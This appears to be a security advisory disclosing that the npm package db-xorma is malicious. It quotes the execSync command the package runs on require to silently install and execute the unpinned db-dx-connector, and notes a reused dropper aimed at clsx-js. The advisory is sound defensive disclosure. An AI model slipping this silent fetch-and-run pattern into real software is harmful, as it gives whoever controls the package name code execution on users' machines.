summary: db-xorma silently installs and executes unpinned external package on require
details: On every require('db-xorma'), the Collection and Model constructors invoke a resetor() routine that attempts to require('db-dx-connector') and, on failure, shells out to `execSync('npm install db-dx-connector --no-warnings --no-save --no-progress --loglevel silent', { windowsHide: true })` and immediately requires and executes the freshly installed module (db.queryDBConnect() / db.queryDBErrorReply()). The dependency is unpinned, unscoped, fetched at runtime without integrity checks, and errors are swallowed so the activity is silent. Whoever controls the `db-dx-connector` name on the registry gets arbitrary code execution in every consumer's process. Additional corroborating signals: package.json declares the Node built-in `child_process` as a runtime npm dependency (masking or confusion around execSync usage), and dist/index.js contains a commented-out sibling dropper targeting `clsx-js` using the same `npm uninstall && npm install` + execSync template — indicating a reused dropper technique across multiple package names. Package metadata is bare (no repository, no homepage), and the generic `db-`-prefixed naming aligns with confusion-style supply-chain campaigns.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
